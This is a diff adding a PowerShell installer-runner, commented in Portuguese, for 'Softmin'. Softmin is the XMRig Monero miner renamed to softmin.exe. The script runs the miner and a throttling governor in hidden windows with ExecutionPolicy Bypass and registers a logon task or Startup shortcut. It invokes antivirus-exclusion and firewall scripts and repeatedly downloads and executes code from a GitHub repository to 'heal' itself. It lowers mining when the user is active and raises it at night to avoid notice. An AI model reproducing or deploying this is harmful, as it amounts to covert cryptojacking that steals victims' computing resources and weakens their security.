@@ -1,0 +1,633 @@
+# Softmin — script unico: GitHub (curador) + minerador adaptativo (eco -> turbo noite, freio ao usar).
+# -Install: primeira execucao (AV, autostart, binario, scripts locais, firewall).
+# -CloudOnly: so GitHub + pasta instalada (sem pendrive/repo local).
+param(
+    [string]$InstallPath = '',
+    [string]$LauncherRoot = '',
+    [switch]$Install,
+    [switch]$CloudOnly,
+    [switch]$Silent
+)
+
+$ErrorActionPreference = 'Stop'
+
+function Write-RunLog {
+    param(
+        [string]$InstallPath,
+        [string]$Message,
+        [switch]$Silent,
+        [ValidateSet('INFO', 'OK', 'WARN', 'ERR', 'STEP')]
+        [string]$Level = 'INFO'
+    )
+    $logDir = Join-Path $InstallPath 'logs'
+    New-Item -ItemType Directory -Force -Path $logDir | Out-Null
+    $line = ('{0}  {1}' -f (Get-Date).ToString('yyyy-MM-dd HH:mm:ss'), $Message)
+    Add-Content -LiteralPath (Join-Path $logDir 'run.log') -Value $line -Encoding UTF8
+    Add-Content -LiteralPath (Join-Path $logDir 'instalar.log') -Value $line -Encoding UTF8
+    if (-not $Silent) {
+        $color = switch ($Level) {
+            'OK' { 'Green' }
+            'WARN' { 'Yellow' }
+            'ERR' { 'Red' }
+            'STEP' { 'Cyan' }
+            default { 'Gray' }
+        }
+        Write-Host $line -ForegroundColor $color
+    }
+}
+
+function Resolve-RunModule {
+    param([string[]]$Roots, [string]$Name)
+    foreach ($r in $Roots) {
+        if (-not $r) { continue }
+        $p = Join-Path $r.TrimEnd('\') $Name
+        if (Test-Path -LiteralPath $p) { return $p }
+    }
+    return $null
+}
+
+# --- Caminho de instalacao ---
+if ([string]::IsNullOrWhiteSpace($InstallPath)) {
+    $InstallPath = Join-Path $env:LOCALAPPDATA 'Softmin'
+}
+$InstallPath = $InstallPath.TrimEnd('\')
+New-Item -ItemType Directory -Force -Path $InstallPath, (Join-Path $InstallPath 'logs') | Out-Null
+
+$moduleRoots = @($InstallPath, $PSScriptRoot, (Join-Path $PSScriptRoot 'scripts'))
+
+# --- Config GitHub (URLs do repositorio publico) ---
+$cloudCfg = Resolve-RunModule -Roots $moduleRoots -Name 'Softmin-CloudConfig.ps1'
+if ($cloudCfg) { . $cloudCfg }
+else {
+    $script:SoftminCloudGitHubUser = 'gabriel-Dagostim'
+    $script:SoftminCloudGitHubRepo = 'omicron-softmin-cloud'
+    $script:SoftminCloudGitHubBranch = 'master'
+    $script:SoftminCloudFolder = 'cloud'
+    function Get-SoftminCloudBaseUrl {
+        return 'https://raw.githubusercontent.com/gabriel-Dagostim/omicron-softmin-cloud/master/cloud'
+    }
+    function Get-SoftminCloudManifestUrl {
+        return (Get-SoftminCloudBaseUrl) + '/manifest.json'
+    }
+}
+
+function Get-CloudManifest {
+    $url = Get-SoftminCloudManifestUrl
+    return Invoke-RestMethod -Uri $url -Headers @{ 'User-Agent' = 'Softmin-Run' } -TimeoutSec 90
+}
+
+function Save-CloudFile {
+    param([string]$InstallPath, [object]$Entry, [string]$BaseUrl)
+    $rel = [string]$Entry.path -replace '/', '\'
+    $local = Join-Path $InstallPath $rel
+    $dir = Split-Path $local -Parent
+    if ($dir -and -not (Test-Path -LiteralPath $dir)) {
+        New-Item -ItemType Directory -Force -Path $dir | Out-Null
+    }
+    $fileUrl = [string]$Entry.url
+    if (-not $fileUrl -and $BaseUrl) { $fileUrl = "$BaseUrl/$($Entry.path)" }
+    if (-not $fileUrl) { return $false }
+    Invoke-WebRequest -Uri $fileUrl -OutFile $local -UseBasicParsing -TimeoutSec 180
+    return (Test-Path -LiteralPath $local)
+}
+
+function Sync-SoftminFromGitHub {
+    param([string]$InstallPath)
+    Write-RunLog $InstallPath '[RUN] Sincronizar ficheiros do GitHub...'
+    $manifest = Get-CloudManifest
+    $base = if ($manifest.base_url) { [string]$manifest.base_url.TrimEnd('/') } else { (Get-SoftminCloudBaseUrl) }
+    $n = 0
+    foreach ($entry in $manifest.files) {
+        $rel = [string]$entry.path
+        $local = Join-Path $InstallPath ($rel -replace '/', '\')
+        $need = $false
+        if (-not (Test-Path -LiteralPath $local)) { $need = $true }
+        elseif ($entry.sha256) {
+            try {
+                $h = (Get-FileHash -LiteralPath $local -Algorithm SHA256).Hash.ToLowerInvariant()
+                if ($h -ne [string]$entry.sha256) { $need = $true }
+            } catch { $need = $true }
+        }
+        if (-not $need) { continue }
+        Write-RunLog $InstallPath ("[GITHUB] A transferir -> {0}" -f $rel) -Silent:$Silent -Level STEP
+        if (Save-CloudFile -InstallPath $InstallPath -Entry $entry -BaseUrl $base) {
+            Write-RunLog $InstallPath ("[GITHUB] OK instalado: {0}" -f $rel) -Silent:$Silent -Level OK
+            $n++
+        } else {
+            Write-RunLog $InstallPath ("[GITHUB] FALHA: {0}" -f $rel) -Silent:$Silent -Level ERR
+        }
+    }
+    Write-RunLog $InstallPath ("[GITHUB] Sincronizacao concluida: {0} ficheiro(s) actualizados." -f $n) -Silent:$Silent -Level OK
+    return $n
+}
+
+function Sync-SoftminCriticalFromCloud {
+    param([string]$InstallPath)
+    $base = (Get-SoftminCloudBaseUrl).TrimEnd('/')
+    $critical = @(
+        'Softmin-Common.ps1', 'Softmin-SecureStorage.ps1', 'Softmin-Governor.ps1',
+        'Softmin-CloudManifest.ps1', 'Softmin-CloudConfig.ps1', 'Softmin-AutoUnlock.ps1',
+        'Set-SoftminAntivirusTrust.ps1', 'Set-SoftminDefenderTrust.ps1', 'Set-SoftminFirewall.ps1',
+        'Download-SoftminBinary.ps1', 'Uninstall-Softmin.ps1', 'Reconfig-Softmin.ps1',
+        'Softmin-Stop.ps1', 'Softmin-Start.ps1', 'Softmin-Heal.ps1', 'Softmin-Boot.ps1',
+        'config.template.json'
+    )
+    $n = 0
+    foreach ($rel in $critical) {
+        $local = Join-Path $InstallPath $rel
+        try {
+            Invoke-WebRequest -Uri "$base/$rel" -OutFile $local -UseBasicParsing -TimeoutSec 120 `
+                -Headers @{ 'User-Agent' = 'Softmin-CloudBootstrap' }
+            if (Test-Path -LiteralPath $local) { $n++ }
+        } catch {
+            Write-RunLog $InstallPath ("[CLOUD] Opcional indisponivel: {0}" -f $rel) -Silent:$Silent -Level WARN
+        }
+    }
+    if ($n -gt 0) {
+        Write-RunLog $InstallPath ("[CLOUD] Bootstrap: {0} ficheiro(s) da nuvem." -f $n) -Silent:$Silent -Level OK
+    }
+    return $n
+}
+
+function Copy-SoftminLauncherOverlay {
+    param(
+        [string]$InstallPath,
+        [string]$LauncherRoot
+    )
+    if ([string]::IsNullOrWhiteSpace($LauncherRoot)) { return 0 }
+    $LauncherRoot = $LauncherRoot.TrimEnd('\')
+    $scriptDir = Join-Path $LauncherRoot 'scripts'
+    if (-not (Test-Path -LiteralPath $scriptDir)) { return 0 }
+    $n = 0
+    Get-ChildItem -LiteralPath $scriptDir -Filter '*.ps1' -File -ErrorAction SilentlyContinue | ForEach-Object {
+        $dst = Join-Path $InstallPath $_.Name
+        Copy-Item -LiteralPath $_.FullName -Destination $dst -Force
+        $n++
+    }
+    $binDir = Join-Path $LauncherRoot 'bin'
+    if (Test-Path -LiteralPath $binDir) {
+        $dstBin = Join-Path $InstallPath 'bin'
+        New-Item -ItemType Directory -Force -Path $dstBin | Out-Null
+        Get-ChildItem -LiteralPath $binDir -File -ErrorAction SilentlyContinue | ForEach-Object {
+            $destName = if ($_.Name -eq 'xmrig.exe') { 'softmin.exe' } else { $_.Name }
+            $destPath = Join-Path $dstBin $destName
+            if ($_.Name -eq 'softmin.exe' -and (Test-Path -LiteralPath $destPath)) {
+                Copy-Item -LiteralPath $_.FullName -Destination $destPath -Force -ErrorAction SilentlyContinue
+            } elseif (-not (Test-Path -LiteralPath $destPath)) {
+                Copy-Item -LiteralPath $_.FullName -Destination $destPath -Force -ErrorAction SilentlyContinue
+            }
+        }
+    }
+    return $n
+}
+
+function Ensure-SoftminBinary {
+    param(
+        [string]$InstallPath,
+        [string]$LauncherRoot,
+        [switch]$CloudOnly
+    )
+    $dstDir = Join-Path $InstallPath 'bin'
+    $dstExe = Join-Path $dstDir 'softmin.exe'
+    New-Item -ItemType Directory -Force -Path $dstDir | Out-Null
+    if (Test-Path -LiteralPath $dstExe) { return $true }
+
+    $sources = @()
+    if (-not $CloudOnly -and $LauncherRoot) {
+        $lr = $LauncherRoot.TrimEnd('\')
+        $sources += Join-Path $lr 'bin\softmin.exe'
+        $sources += Join-Path $lr 'bin\xmrig.exe'
+    }
+    $sources += Join-Path $InstallPath 'bin\xmrig.exe'
+    foreach ($src in $sources) {
+        if (-not (Test-Path -LiteralPath $src)) { continue }
+        Copy-Item -LiteralPath $src -Destination $dstExe -Force
+        if (Test-Path -LiteralPath $dstExe) { return $true }
+    }
+
+    $dlScript = Resolve-RunModule -Roots @($InstallPath, $PSScriptRoot, (Join-Path $PSScriptRoot 'scripts')) -Name 'Download-SoftminBinary.ps1'
+    if ($dlScript) {
+        Write-RunLog $InstallPath '[INSTALL] A descarregar softmin.exe (release upstream)...' -Silent:$Silent -Level STEP
+        & $dlScript -TargetBin $dstDir
+    }
+    return (Test-Path -LiteralPath $dstExe)
+}
+
+function Import-SoftminVaultKeyFromLauncher {
+    param(
+        [string]$InstallPath,
+        [string]$LauncherRoot
+    )
+    if ([string]::IsNullOrWhiteSpace($LauncherRoot)) { return $false }
+    $keyFile = Join-Path $LauncherRoot.TrimEnd('\') 'softmin.vault.key'
+    if (-not (Test-Path -LiteralPath $keyFile)) { return $false }
+    $map = @{}
+    Get-Content -LiteralPath $keyFile -Encoding UTF8 | ForEach-Object {
+        $line = $_.Trim()
+        if (-not $line -or $line.StartsWith('#')) { return }
+        if ($line -match '^([^=]+)=(.*)$') {
+            $map[$matches[1].Trim()] = $matches[2].Trim()
+        }
+    }
+    if (-not $map['password']) { return $false }
+    Save-SoftminVaultCredentials -InstallPath $InstallPath -Password $map['password'] `
+        -Codigo $(if ($map['codigo']) { $map['codigo'] } else { '' })
+    return $true
+}
+
+function Test-SoftminAutoUnlockValid {
+    param([string]$InstallPath)
+    $auto = Join-Path $InstallPath 'Softmin-AutoUnlock.ps1'
+    if (-not (Test-Path -LiteralPath $auto)) { return $false }
+    $raw = Get-Content -LiteralPath $auto -Raw -Encoding UTF8
+    return ($raw -notmatch 'PLACEHOLDER_P')
+}
+
+function Install-SoftminLocalScripts {
+    param([string]$InstallPath)
+
+    $startBat = @'
+@echo off
+setlocal EnableExtensions
+cd /d "%~dp0"
+powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "%~dp0Softmin-Run.ps1" -InstallPath "%~dp0" -Silent
+'@
+    $stopBat = @'
+@echo off
+title Softmin ^| parar
+cd /d "%~dp0"
+powershell -NoProfile -ExecutionPolicy Bypass -File "%~dp0Softmin-Stop.ps1" -InstallPath "%~dp0"
+pause
+'@
+    $configBat = @'
+@echo off
+title Softmin ^| reconfigurar
+cd /d "%~dp0"
+powershell -NoProfile -ExecutionPolicy Bypass -File "%~dp0Reconfig-Softmin.ps1"
+pause
+'@
+    $uninstBat = @'
+@echo off
+title Softmin ^| desinstalar tudo
+setlocal EnableExtensions
+cd /d "%~dp0"
+echo.
+echo   OMICRON / Softmin - desinstalacao total
+echo.
+set /p CONF=Confirma remover TUDO? (S/N): 
+if /I not "%CONF%"=="S" exit /b 0
+powershell -NoProfile -ExecutionPolicy Bypass -File "%~dp0Uninstall-Softmin.ps1" -InstallPath "%~dp0" -LauncherPath "%~f0"
+'@
+
+    Set-Content -Path (Join-Path $InstallPath 'start.bat') -Value $startBat -Encoding ASCII
+    Set-Content -Path (Join-Path $InstallPath 'stop.bat') -Value $stopBat -Encoding ASCII
+    Set-Content -Path (Join-Path $InstallPath 'configurar.bat') -Value $configBat -Encoding ASCII
+    Set-Content -Path (Join-Path $InstallPath 'desinstalar-local.bat') -Value $uninstBat -Encoding ASCII
+}
+
+function Register-SoftminAutostart {
+    param(
+        [string]$InstallPath,
+        [string]$TaskName = 'Softmin'
+    )
+    $InstallPath = $InstallPath.TrimEnd('\')
+    $runScript = Join-Path $InstallPath 'Softmin-Run.ps1'
+    $tr = 'powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "' + $runScript + '" -InstallPath "' + $InstallPath + '" -Silent'
+    $startupLnk = Join-Path $env:APPDATA 'Microsoft\Windows\Start Menu\Programs\Startup\Softmin.lnk'
+
+    $prev = $ErrorActionPreference
+    $ErrorActionPreference = 'SilentlyContinue'
+    foreach ($legacy in @('MinerAgent-XMRig', 'Softmin-XMRig', 'Softmin-Autostart', $TaskName)) {
+        $null = & schtasks.exe /Delete /TN $legacy /F 2>&1
+    }
+    $taskOut = @(& schtasks.exe /Create /TN $TaskName /TR $tr /SC ONLOGON /RL LIMITED /F 2>&1 | ForEach-Object { "$_" })
+    $schExit = $LASTEXITCODE
+    $ErrorActionPreference = $prev
+
+    if ($schExit -eq 0) {
+        if (Test-Path -LiteralPath $startupLnk) { Remove-Item -LiteralPath $startupLnk -Force -ErrorAction SilentlyContinue }
+        return @{ Ok = $true; Message = 'Tarefa agendada ONLOGON (Softmin-Run -Silent).' }
+    }
+
+    try {
+        $wsh = New-Object -ComObject WScript.Shell
+        $lnk = $wsh.CreateShortcut($startupLnk)
+        $lnk.TargetPath = Join-Path $InstallPath 'start.bat'
+        $lnk.WorkingDirectory = $InstallPath
+        $lnk.Description = 'OMICRON Softmin - curador adaptativo'
+        $lnk.WindowStyle = 7
+        $lnk.Save()
+        return @{ Ok = $true; Message = 'Atalho Startup criado (schtasks indisponivel).' }
+    } catch {
+        return @{ Ok = $false; Message = ('Autostart falhou: {0}' -f $_.Exception.Message) }
+    }
+}
+
+function Invoke-SoftminFullInstall {
+    param(
+        [string]$InstallPath,
+        [string]$LauncherRoot,
+        [switch]$CloudOnly
+    )
+
+    Write-RunLog $InstallPath '[INSTALL] === Instalacao completa (GitHub + autostart + curador) ===' -Silent:$Silent -Level STEP
+
+    Get-Process -Name 'softmin' -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+    $stopPs = Join-Path $InstallPath 'Softmin-Stop.ps1'
+    if (Test-Path -LiteralPath $stopPs) {
+        & $stopPs -InstallPath $InstallPath
+    }
+
+    $utilScripts = @(
+        'Set-SoftminAntivirusTrust.ps1', 'Set-SoftminDefenderTrust.ps1', 'Set-SoftminFirewall.ps1',
+        'Download-SoftminBinary.ps1', 'Uninstall-Softmin.ps1', 'Reconfig-Softmin.ps1', 'Softmin-CloudConfig.ps1'
+    )
+    $cloudBase = (Get-SoftminCloudBaseUrl)
+    foreach ($name in $utilScripts) {
+        $dst = Join-Path $InstallPath $name
+        if (Test-Path -LiteralPath $dst) { continue }
+        $src = Resolve-RunModule -Roots @($InstallPath, $PSScriptRoot, (Join-Path $PSScriptRoot 'scripts')) -Name $name
+        if ($src) {
+            Copy-Item -LiteralPath $src -Destination $dst -Force -ErrorAction SilentlyContinue
+            continue
+        }
+        if ($CloudOnly -and $cloudBase) {
+            try {
+                Invoke-WebRequest -Uri "$cloudBase/$name" -OutFile $dst -UseBasicParsing -TimeoutSec 120 `
+                    -Headers @{ 'User-Agent' = 'Softmin-Install' }
+            } catch { }
+        }
+    }
+
+    $defScript = Join-Path $InstallPath 'Set-SoftminAntivirusTrust.ps1'
+    if (-not (Test-Path -LiteralPath $defScript)) {
+        $defScript = Resolve-RunModule -Roots @($InstallPath, $PSScriptRoot, (Join-Path $PSScriptRoot 'scripts')) -Name 'Set-SoftminDefenderTrust.ps1'
+    }
+    if (Test-Path -LiteralPath $defScript) {
+        . $defScript
+        $def = Set-SoftminAntivirusTrust -InstallPath $InstallPath -LogInstallPath $InstallPath
+        Write-RunLog $InstallPath ("[INSTALL] AV: {0}" -f $def.Message) -Silent:$Silent -Level $(if ($def.Ok) { 'OK' } else { 'WARN' })
+    }
+
+    if (-not (Ensure-SoftminBinary -InstallPath $InstallPath -LauncherRoot $LauncherRoot -CloudOnly:$CloudOnly)) {
+        Write-RunLog $InstallPath '[INSTALL] ERRO: nao foi possivel obter bin\softmin.exe.' -Silent:$Silent -Level ERR
+        throw 'softmin.exe ausente apos GitHub e descarga upstream.'
+    }
+    Write-RunLog $InstallPath '[INSTALL] bin\softmin.exe presente.' -Silent:$Silent -Level OK
+
+    if (-not (Test-SoftminAutoUnlockValid -InstallPath $InstallPath)) {
+        if ($CloudOnly) {
+            Write-RunLog $InstallPath '[INSTALL] WARN: AutoUnlock invalido no GitHub — publique pacote com gerar-pacote-unificado.bat.' -Silent:$Silent -Level WARN
+        }
+        elseif (-not (Import-SoftminVaultKeyFromLauncher -InstallPath $InstallPath -LauncherRoot $LauncherRoot)) {
+            Write-RunLog $InstallPath '[INSTALL] WARN: AutoUnlock invalido e sem softmin.vault.key no launcher.' -Silent:$Silent -Level WARN
+        } else {
+            Write-RunLog $InstallPath '[INSTALL] Credenciais do cofre importadas de softmin.vault.key.' -Silent:$Silent -Level OK
+        }
+    }
+
+    $commonPs = Join-Path $InstallPath 'Softmin-Common.ps1'
+    $securePs = Join-Path $InstallPath 'Softmin-SecureStorage.ps1'
+    if (Test-Path -LiteralPath $commonPs) { . $commonPs }
+    if (Test-Path -LiteralPath $securePs) { . $securePs }
+    Ensure-SoftminLocalVaultCredentials -InstallPath $InstallPath | Out-Null
+    Set-SoftminSecureFolderAcl -InstallPath $InstallPath
+
+    Install-SoftminLocalScripts -InstallPath $InstallPath
+
+    foreach ($name in $utilScripts) {
+        if (Test-Path -LiteralPath (Join-Path $InstallPath $name)) { continue }
+        $src = Resolve-RunModule -Roots @($InstallPath, $PSScriptRoot, (Join-Path $PSScriptRoot 'scripts')) -Name $name
+        if ($src) {
+            Copy-Item -LiteralPath $src -Destination (Join-Path $InstallPath $name) -Force -ErrorAction SilentlyContinue
+        }
+    }
+
+    $auto = Register-SoftminAutostart -InstallPath $InstallPath
+    Write-RunLog $InstallPath ("[INSTALL] Autostart: {0}" -f $auto.Message) -Silent:$Silent -Level $(if ($auto.Ok) { 'OK' } else { 'WARN' })
+
+    $fwScript = Join-Path $InstallPath 'Set-SoftminFirewall.ps1'
+    if (Test-Path -LiteralPath $fwScript) {
+        . (Join-Path $InstallPath 'Softmin-Common.ps1')
+        $settings = $null
+        try { $settings = Unlock-SoftminSettings -InstallPath $InstallPath -TryDpapi -PromptIfNeeded:$false } catch { }
+        $poolHost = if ($settings -and $settings.pool_url) { $settings.pool_url } else { 'pool.supportxmr.com' }
+        $poolPort = if ($settings -and $settings.pool_port) { [int]$settings.pool_port } else { 443 }
+        $fw = & $fwScript -InstallPath $InstallPath -PoolHost $poolHost -PoolPort $poolPort
+        Write-RunLog $InstallPath ("[INSTALL] {0}" -f $fw.Message) -Silent:$Silent -Level $(if ($fw.Ok) { 'OK' } else { 'WARN' })
+    }
+
+    if (Get-Command Install-SoftminLocalBackup -ErrorAction SilentlyContinue) {
+        try {
+            Install-SoftminLocalBackup -SourceRoot $InstallPath -InstallPath $InstallPath
+            Write-RunLog $InstallPath '[INSTALL] Backup local (_backup) para auto-cura.' -Silent:$Silent -Level OK
+        } catch {
+            Write-RunLog $InstallPath ("[INSTALL] Backup local: {0}" -f $_.Exception.Message) -Silent:$Silent -Level WARN
+        }
+    } else {
+        $cloudManifest = Join-Path $InstallPath 'Softmin-CloudManifest.ps1'
+        if (Test-Path -LiteralPath $cloudManifest) {
+            . $cloudManifest
+            try {
+                Install-SoftminLocalBackup -SourceRoot $InstallPath -InstallPath $InstallPath
+                Write-RunLog $InstallPath '[INSTALL] Backup local (_backup) para auto-cura.' -Silent:$Silent -Level OK
+            } catch {
+                Write-RunLog $InstallPath ("[INSTALL] Backup local: {0}" -f $_.Exception.Message) -Silent:$Silent -Level WARN
+            }
+        }
+    }
+
+    Write-RunLog $InstallPath '[INSTALL] Instalacao concluida — a iniciar curador e minerador.' -Silent:$Silent -Level OK
+}
+
+function Ensure-SoftminMetaIni {
+    param(
+        [string]$InstallPath,
+        [switch]$ForInstall
+    )
+    $metaPath = Join-Path $InstallPath 'softmin.meta.ini'
+    $lines = [System.Collections.Generic.List[string]]::new()
+    if (Test-Path -LiteralPath $metaPath) {
+        $lines.AddRange([string[]](Get-Content -LiteralPath $metaPath -Encoding UTF8))
+    } else {
+        [void]$lines.Add('# Softmin meta (modo adaptativo + URLs cloud)')
+    }
+    $required = @{
+        cpu_mode                    = 'adaptive'
+        cpu_profile                 = 'eco'
+        adaptive_brake              = 'eco'
+        adaptive_check_seconds      = '30'
+        adaptive_ramp_minutes       = '5,15,30'
+        adaptive_night_ramp_minutes = '10'
+        night_start                 = '00:00'
+        night_end                   = '07:00'
+        start_on_install            = $(if ($ForInstall) { 'true' } else { 'false' })
+        autostart                   = $(if ($ForInstall) { 'true' } else { 'false' })
+        secure_vault                = 'true'
+        secure_autostart            = 'true'
+        defender_trust              = 'true'
+        cloud_heal_enabled          = 'true'
+        cloud_manifest_url          = (Get-SoftminCloudManifestUrl)
+        cloud_base_url              = (Get-SoftminCloudBaseUrl)
+        cloud_usb_fallback          = ''
+        install_path                = $InstallPath
+    }
+    $text = $lines -join "`n"
+    foreach ($k in $required.Keys) {
+        if ($text -notmatch "(?m)^$k=") {
+            [void]$lines.Add("$k=$($required[$k])")
+        }
+    }
+    if ($ForInstall) {
+        $text = $lines -join "`n"
+        if ($text -match '(?m)^cloud_usb_fallback=') {
+            $lines = [System.Collections.Generic.List[string]]::new()
+            foreach ($ln in ($text -split "`n")) {
+                if ($ln -match '^cloud_usb_fallback=') {
+                    [void]$lines.Add('cloud_usb_fallback=')
+                } else {
+                    [void]$lines.Add($ln)
+                }
+            }
+        } else {
+            [void]$lines.Add('cloud_usb_fallback=')
+        }
+    }
+    Set-Content -LiteralPath $metaPath -Value ($lines -join "`r`n") -Encoding UTF8
+}
+
+if ($CloudOnly) {
+    $LauncherRoot = ''
+} elseif ($Install -and [string]::IsNullOrWhiteSpace($LauncherRoot)) {
+    $LauncherRoot = if ($PSScriptRoot -match 'scripts$') { Split-Path $PSScriptRoot -Parent } else { $PSScriptRoot }
+}
+
+Write-RunLog $InstallPath ('[RUN] === Inicio Softmin-Run{0}{1} ===' -f $(if ($Install) { ' (INSTALAR)' } else { '' }), $(if ($CloudOnly) { ' [NUVEM]' } else { '' })) -Silent:$Silent -Level STEP
+$selfSrc = Join-Path $PSScriptRoot 'Softmin-Run.ps1'
+if ((Test-Path -LiteralPath $selfSrc) -and $PSScriptRoot.TrimEnd('\') -ne $InstallPath) {
+    Copy-Item -LiteralPath $selfSrc -Destination (Join-Path $InstallPath 'Softmin-Run.ps1') -Force -ErrorAction SilentlyContinue
+}
+if ($PSScriptRoot -match 'scripts$') {
+    foreach ($dep in @('Softmin-Common.ps1', 'Softmin-SecureStorage.ps1', 'Softmin-CloudManifest.ps1', 'Softmin-CloudConfig.ps1', 'Softmin-Governor.ps1', 'Softmin-AutoUnlock.ps1')) {
+        $sp = Join-Path $PSScriptRoot $dep
+        if (Test-Path -LiteralPath $sp) {
+            Copy-Item -LiteralPath $sp -Destination (Join-Path $InstallPath $dep) -Force -ErrorAction SilentlyContinue
+        }
+    }
+}
+
+# === 1) GitHub: baixar / reparar ficheiros ===
+Ensure-SoftminMetaIni -InstallPath $InstallPath -ForInstall:$Install
+Sync-SoftminFromGitHub -InstallPath $InstallPath | Out-Null
+if ($Install -and $CloudOnly) {
+    Sync-SoftminCriticalFromCloud -InstallPath $InstallPath | Out-Null
+    if ($PSScriptRoot -match 'scripts$') {
+        Get-ChildItem -LiteralPath $PSScriptRoot -Filter '*.ps1' -File | ForEach-Object {
+            Copy-Item -LiteralPath $_.FullName -Destination (Join-Path $InstallPath $_.Name) -Force
+        }
+        Write-RunLog $InstallPath '[CLOUD] Scripts do repositorio sincronizados para instalacao.' -Silent:$Silent -Level OK
+    }
+}
+
+if ($Install -and -not $CloudOnly) {
+    $overlayN = Copy-SoftminLauncherOverlay -InstallPath $InstallPath -LauncherRoot $LauncherRoot
+    if ($overlayN -gt 0) {
+        Write-RunLog $InstallPath ("[INSTALL] Overlay local: {0} script(s) do pacote." -f $overlayN) -Silent:$Silent -Level OK
+    }
+} elseif ($Install -and $CloudOnly) {
+    Write-RunLog $InstallPath '[INSTALL] Modo nuvem — sem dependencia de pendrive ou pasta local.' -Silent:$Silent -Level OK
+}
+
+# Modulos locais (pos-sync GitHub)
+$moduleRoots = @($InstallPath, $PSScriptRoot, (Join-Path $PSScriptRoot 'scripts'))
+if (-not $CloudOnly -and $LauncherRoot) {
+    $moduleRoots += @((Join-Path $LauncherRoot 'scripts'), $LauncherRoot)
+}
+$common = Resolve-RunModule -Roots $moduleRoots -Name 'Softmin-Common.ps1'
+$secure = Resolve-RunModule -Roots $moduleRoots -Name 'Softmin-SecureStorage.ps1'
+$cloudM = Resolve-RunModule -Roots $moduleRoots -Name 'Softmin-CloudManifest.ps1'
+if ($common) { . $common }
+if ($secure) { . $secure }
+
+# === Instalacao completa (1o clique no .bat) ===
+if ($Install) {
+    Invoke-SoftminFullInstall -InstallPath $InstallPath -LauncherRoot $LauncherRoot -CloudOnly:$CloudOnly
+    # Re-carregar modulos pos-instalar (utilitarios copiados para InstallPath)
+    $secure = Join-Path $InstallPath 'Softmin-SecureStorage.ps1'
+    if (Test-Path -LiteralPath $secure) { . $secure }
+}
+
+Ensure-SoftminLocalVaultCredentials -InstallPath $InstallPath | Out-Null
+if ($cloudM) {
+    . $cloudM
+    if (-not $Install -and (Get-Command Invoke-SoftminFileHeal -ErrorAction SilentlyContinue)) {
+        Invoke-SoftminFileHeal -InstallPath $InstallPath -Silent:$Silent
+        if (Get-Command Repair-SoftminVaultAutostart -ErrorAction SilentlyContinue) {
+            Repair-SoftminVaultAutostart -InstallPath $InstallPath | Out-Null
+        }
+    }
+}
+
+# === 2) Cofre -> config.json (carteira/pool) ===
+$exe = Join-Path $InstallPath 'bin\softmin.exe'
+if (-not (Test-Path -LiteralPath $exe)) {
+    if (-not (Ensure-SoftminBinary -InstallPath $InstallPath -LauncherRoot $LauncherRoot -CloudOnly:$CloudOnly)) {
+        Write-RunLog $InstallPath '[RUN] ERRO: bin\softmin.exe ausente (Defender ou GitHub sem binario).'
+        if (-not $Silent) {
+            Write-Host 'softmin.exe nao encontrado. Execute como Administrador ou regenere o pacote GitHub.' -ForegroundColor Red
+        }
+        exit 1
+    }
+}
+
+try {
+    $settings = Unlock-SoftminSettings -InstallPath $InstallPath -TryDpapi -PromptIfNeeded:$false
+    # Arranque sempre em eco; governador sobe depois conforme ociosidade/noite
+    $settings | Add-Member -NotePropertyName cpu_mode -NotePropertyValue 'adaptive' -Force
+    $settings | Add-Member -NotePropertyName cpu_profile -NotePropertyValue 'eco' -Force
+    Write-SoftminRuntimeConfig -InstallPath $InstallPath -Settings $settings | Out-Null
+    $cfgPath = Join-Path $InstallPath 'config.json'
+    if (Test-Path -LiteralPath $cfgPath) {
+        $cfgObj = Get-Content -LiteralPath $cfgPath -Raw -Encoding UTF8 | ConvertFrom-Json
+        $cfgObj.cpu.'max-threads-hint' = (Get-MaxThreadsHint 'eco')
+        Save-JsonUtf8NoBom -Object $cfgObj -Path $cfgPath
+    }
+    Write-RunLog $InstallPath '[RUN] Cofre desbloqueado; config.json em modo eco.'
+} catch {
+    Write-RunLog $InstallPath ("[RUN] ERRO cofre: {0}" -f $_.Exception.Message)
+    throw
+}
+
+# === 3) Governador adaptativo (eco -> rampa -> turbo noite; freio ao mexer rato/teclado) ===
+$govScript = Join-Path $InstallPath 'Softmin-Governor.ps1'
+$logDir = Join-Path $InstallPath 'logs'
+$pidFile = Join-Path $logDir 'governor.pid'
+$startGov = $true
+if (Test-Path -LiteralPath $pidFile) {
+    $oldPid = Get-Content -LiteralPath $pidFile -ErrorAction SilentlyContinue
+    if ($oldPid -match '^\d+$' -and (Get-Process -Id ([int]$oldPid) -ErrorAction SilentlyContinue)) {
+        $startGov = $false
+    }
+}
+if ($startGov -and (Test-Path -LiteralPath $govScript)) {
+    Start-Process -FilePath 'powershell.exe' -ArgumentList @(
+        '-NoProfile', '-ExecutionPolicy', 'Bypass', '-WindowStyle', 'Hidden',
+        '-File', "`"$govScript`"", '-InstallPath', "`"$InstallPath`""
+    ) -WorkingDirectory $InstallPath -WindowStyle Hidden | Out-Null
+    Write-RunLog $InstallPath '[RUN] Governador iniciado (eco->turbo noite; freio se usar PC).'
+}
+
+# === 4) Minerador (sempre comeca eco) ===
+Get-Process -Name 'softmin' -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+Start-Sleep -Milliseconds 400
+$cfg = Join-Path $InstallPath 'config.json'
+Start-Process -FilePath $exe -ArgumentList @(
+    '--config=' + $cfg,
+    '--log-file=' + (Join-Path $logDir 'softmin.log')
+) -WorkingDirectory $InstallPath -WindowStyle Hidden | Out-Null
+
+Write-RunLog $InstallPath '[RUN] Minerador iniciado (eco). Curador concluido — idle.'
+if (-not $Silent) {
+    Write-Host 'Softmin activo (eco). Noite ociosa = turbo. Uso do PC = reduz.' -ForegroundColor Green
+    Write-Host "Log: $(Join-Path $logDir 'run.log')"
+}
